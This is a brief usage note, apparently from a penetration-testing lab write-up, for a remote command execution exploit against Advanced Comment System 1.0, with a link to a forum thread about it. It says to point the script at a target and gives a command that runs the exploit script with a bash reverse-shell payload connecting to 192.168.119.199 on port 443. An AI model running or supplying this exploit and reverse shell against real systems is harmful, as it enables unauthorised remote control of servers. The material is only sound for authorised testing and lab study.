<https://memoryhackers.org/konular/advanced-comment-system-1-0-remote-command-execution-exploit.221924/>

Modify url in script to your target. Be mindful of firewall rules on reverse shell.

python3 acs.py 'bash -i >& /dev/tcp/192.168.119.199/443 0>&1'

 
![unnamed_cc1cab1f09ee400a9eff61b691a90444](unnamed_cc1cab1f09ee400a9eff61b691a90444.png)
